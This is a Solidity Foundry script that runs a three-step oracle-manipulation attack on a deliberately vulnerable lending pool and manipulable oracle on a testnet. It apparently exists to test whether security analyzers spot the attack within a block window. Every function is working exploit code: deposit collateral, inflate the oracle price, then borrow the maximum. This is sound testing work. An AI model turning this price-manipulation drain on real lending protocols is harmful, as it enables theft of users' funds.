// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Script, console2} from "forge-std/Script.sol";
import {VulnerableLendingPool} from "../src/VulnerableLendingPool.sol";
import {ManipulableOracle} from "../src/ManipulableOracle.sol";
import {MockERC20} from "../src/MockERC20.sol";

/// Reproduces the multi-block exploit on a live testnet.
///
///   STEP 1 (`deposit`)        : attacker deposits collateral
///   STEP 2 (`bump`, block N)  : attacker manipulates oracle 1000x — VISIBLE TO ANALYZERS
///   STEP 3 (`drain`, block N+1): attacker borrows max against revalued collateral
///
/// Run as three separate transactions so the analyzer race window is real:
///
///   forge script script/Attacker.s.sol --sig 'deposit()' --broadcast --rpc-url $ZEROG_TESTNET_RPC
///   forge script script/Attacker.s.sol --sig 'bump()'    --broadcast --rpc-url $ZEROG_TESTNET_RPC
///   # ...wait at least one block for analyzers to detect, then:
///   forge script script/Attacker.s.sol --sig 'drain()'   --broadcast --rpc-url $ZEROG_TESTNET_RPC
///
/// All three sigs read addresses from deployments/<chainId>.json so the same
/// PRIVATE_KEY just works after `Deploy.s.sol` ran.
contract Attacker is Script {
    function _addrs() internal view returns (address oracle, address pool, address collateral) {
        string memory path = string.concat("./deployments/", vm.toString(block.chainid), ".json");
        string memory j = vm.readFile(path);
        oracle = vm.parseJsonAddress(j, ".oracle");
        pool = vm.parseJsonAddress(j, ".pool");
        collateral = vm.parseJsonAddress(j, ".collateral");
    }

    function deposit() external {
        uint256 pk = vm.envUint("PRIVATE_KEY");
        uint256 amount = vm.envOr("ATTACKER_COLLATERAL", uint256(100e18));
        (, address pool, address collateral) = _addrs();

        vm.startBroadcast(pk);
        MockERC20(collateral).approve(pool, type(uint256).max);
        VulnerableLendingPool(pool).deposit(amount);
        vm.stopBroadcast();

        console2.log("[deposit] amount", amount);
    }

    function bump() external {
        uint256 pk = vm.envUint("PRIVATE_KEY");
        uint256 newPrice = vm.envOr("ATTACK_PRICE", uint256(1000e18));
        (address oracle, , ) = _addrs();

        vm.startBroadcast(pk);
        ManipulableOracle(oracle).bumpPrice(newPrice);
        vm.stopBroadcast();

        console2.log("[bump] new price", newPrice);
        console2.log("[bump] block    ", block.number);
    }

    function drain() external {
        uint256 pk = vm.envUint("PRIVATE_KEY");
        (address oracle, address pool, ) = _addrs();
        uint256 deposited = VulnerableLendingPool(pool).deposits(vm.addr(pk));
        uint256 p = ManipulableOracle(oracle).price();
        uint256 maxBorrow = (deposited * p / 1e18) * 5000 / 10000; // mirrors LTV_BPS

        vm.startBroadcast(pk);
        VulnerableLendingPool(pool).borrow(maxBorrow);
        vm.stopBroadcast();

        console2.log("[drain] borrowed", maxBorrow);
        console2.log("[drain] block   ", block.number);
    }

    /// Convenience for local fork tests — runs all three in one go.
    function run() external {
        this.deposit();
        this.bump();
        this.drain();
    }
}
